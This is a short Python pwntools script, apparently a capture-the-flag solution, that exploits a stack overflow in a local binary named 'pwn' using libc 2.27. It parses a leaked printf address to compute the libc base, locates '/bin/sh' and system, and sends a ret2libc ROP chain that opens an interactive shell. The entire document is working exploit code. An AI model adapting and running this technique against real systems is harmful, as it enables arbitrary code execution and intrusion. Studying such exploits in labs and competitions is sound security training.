#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux')
e = context.binary = ELF("./pwn")
p = e.debug(env={"LD_PRELOAD":"./libc-2.27.so"},
    gdbscript="source /home/nick/global/halfdisp.py"  
+"\nbreak *main+161"
+"\nc"
)
rop = ROP(e)
ELF_LOADED = ELF('./pwn')
libc = ELF('./libc-2.27.so')

pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]

padding = "\x90"*0x28

p.recvuntil(b"Here I am: ")
leak = p.recvline()
leak = leak.strip(b"\n")

base = int(leak, 16) - libc.symbols['printf']
libc.address = base
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols.system


success(f"{hex(base)=}")
success(f"{hex(libc.symbols['printf'])=}")
success(f"{hex(binsh)=}")
success(f"{hex(system)=}")

payload = flat([
padding,
p64(ret),
p64(pop_rdi),
p64(binsh),
p64(system)
])

p.sendline(payload)
p.interactive()
